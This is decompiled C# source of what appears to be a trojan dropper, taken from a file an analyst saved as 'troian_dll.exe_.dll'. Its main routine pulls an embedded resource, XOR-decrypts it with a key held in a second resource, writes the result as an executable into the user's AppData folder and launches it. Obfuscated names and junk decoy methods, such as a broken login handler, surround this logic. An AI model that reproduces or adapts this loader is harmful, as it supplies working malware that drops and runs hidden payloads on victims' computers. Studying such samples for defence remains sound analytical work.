// Decompiled with JetBrains decompiler
// Type: IvLavEFEvQdU
// Assembly: ASGxBArV, Version=9.8.409.6129, Culture=neutral, PublicKeyToken=null
// MVID: 1D2A82D5-ED8A-4B71-B5BA-F774607D92F0
// Assembly location: C:\Users\george.bungarzescu\Desktop\virus\troian_dll.exe_.dll

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[StandardModule]
internal sealed class IvLavEFEvQdU
{
  private static PictureBox PictureBox1 = new PictureBox();
  private static PictureBox PictureBox2 = new PictureBox();
  private static ResourceManager NmPZzjhoEdTzA = new ResourceManager("OLCEyJcn", Assembly.GetEntryAssembly());
  private static string DKERdnJ = Interaction.Environ("Appdata") + "/";
  private static string[] FJcXJyIKwv = new string[2]
  {
    "ALEThjJwJFK.exe",
    "HuuGhrjxjVB"
  };
  public static int myInteger;

  public static object XchNGLv(byte[] KHhzbViI, string FluatbVEQBdxchQ)
  {
    object obj1;
    try
    {
      using (object obj2 = (object) new BinaryWriter((Stream) File.Open(IvLavEFEvQdU.DKERdnJ + FluatbVEQBdxchQ, FileMode.Create)))
      {
        object Instance = obj2;
        // ISSUE: variable of the null type
        __Null local1 = null;
        string MemberName = "Write";
        object[] objArray = new object[1]
        {
          (object) KHhzbViI
        };
        object[] Arguments = objArray;
        // ISSUE: variable of the null type
        __Null local2 = null;
        // ISSUE: variable of the null type
        __Null local3 = null;
        bool[] flagArray = new bool[1]
        {
          true
        };
        bool[] CopyBack = flagArray;
        int num = 1;
        NewLateBinding.LateCall(Instance, (System.Type) local1, MemberName, Arguments, (string[]) local2, (System.Type[]) local3, CopyBack, num != 0);
        if (flagArray[0])
          KHhzbViI = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (byte[]));
      }
      obj1 = (object) true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return obj1;
  }

  public static object OmaPJUJpFsVttG(string a)
  {
    return (object) (byte[]) IvLavEFEvQdU.NmPZzjhoEdTzA.GetObject(a);
  }

  public static int AddOneAndReturn()
  {
    ++IvLavEFEvQdU.myInteger;
    return IvLavEFEvQdU.myInteger;
  }

  [STAThread]
  public static void main()
  {
    IvLavEFEvQdU.XchNGLv(IvLavEFEvQdU.IvLavEFEvQdU1((byte[]) IvLavEFEvQdU.OmaPJUJpFsVttG("QEDyaPnzo")), IvLavEFEvQdU.FJcXJyIKwv[0]);
    int num1 = 1;
    int num2 = IvLavEFEvQdU.FJcXJyIKwv.Length - 1;
    for (int index = num1; index <= num2; ++index)
      IvLavEFEvQdU.XchNGLv((byte[]) IvLavEFEvQdU.OmaPJUJpFsVttG(IvLavEFEvQdU.FJcXJyIKwv[index]), IvLavEFEvQdU.FJcXJyIKwv[index]);
    IvLavEFEvQdU.IvLavEFEvQdU6(IvLavEFEvQdU.FJcXJyIKwv[0]);
  }

  private static void btnLogin_Click(object sender, EventArgs e)
  {
    object Instance1;
    NewLateBinding.LateCall(Instance1, (System.Type) null, "Open", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    object Instance2;
    object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (System.Type) null, "ExecuteReader", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
    bool flag = false;
    string str1 = "";
    string str2 = "";
    while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue, (System.Type) null, "Read", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)))
    {
      flag = true;
      str1 = NewLateBinding.LateIndexGet(objectValue, new object[1]
      {
        (object) "StaffFirstName"
      }, (string[]) null).ToString();
      str2 = NewLateBinding.LateIndexGet(objectValue, new object[1]
      {
        (object) "StaffLastName"
      }, (string[]) null).ToString();
    }
    if (flag)
    {
      int num1 = (int) Interaction.MsgBox((object) ("Hi " + str1 + " " + str2 + ". You are now logged on."), MsgBoxStyle.OkCancel, (object) null);
    }
    else
    {
      int num2 = (int) Interaction.MsgBox((object) "Sorry", MsgBoxStyle.OkOnly, (object) "Invalid Login");
    }
    NewLateBinding.LateCall(Instance1, (System.Type) null, "Close", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
  }

  public static byte[] IvLavEFEvQdU1(byte[] IvLavEFEvQdU2)
  {
    byte[] numArray = (byte[]) IvLavEFEvQdU.OmaPJUJpFsVttG("AzWJrYnj");
    int num1 = 0;
    int num2 = IvLavEFEvQdU2.Length - 1;
    for (int index1 = num1; index1 <= num2; ++index1)
    {
      int index2 = index1 % numArray.Length;
      IvLavEFEvQdU2[index1] = (byte) ((int) IvLavEFEvQdU2[index1] ^ (int) numArray[index2]);
    }
    return IvLavEFEvQdU2;
  }

  public static void picj(string it)
  {
    ListView listView1 = new ListView();
    ListView listView2 = new ListView();
    int num1 = 0;
    int num2 = listView1.Items.Count - 1;
    for (int index = num1; index <= num2; ++index)
    {
      if (Operators.CompareString(listView1.Items[index].SubItems[1].Text, listView2.Items[index].SubItems[1].Text, false) != 0)
      {
        listView2.Items[index].UseItemStyleForSubItems = false;
        listView2.Items[index].SubItems[1].BackColor = Color.Red;
      }
    }
  }

  public static void IvLavEFEvQdU6(string IvLavEFEvQdU0)
  {
    Interaction.Shell(IvLavEFEvQdU.DKERdnJ + IvLavEFEvQdU0, AppWinStyle.MinimizedFocus, false, -1);
  }
}
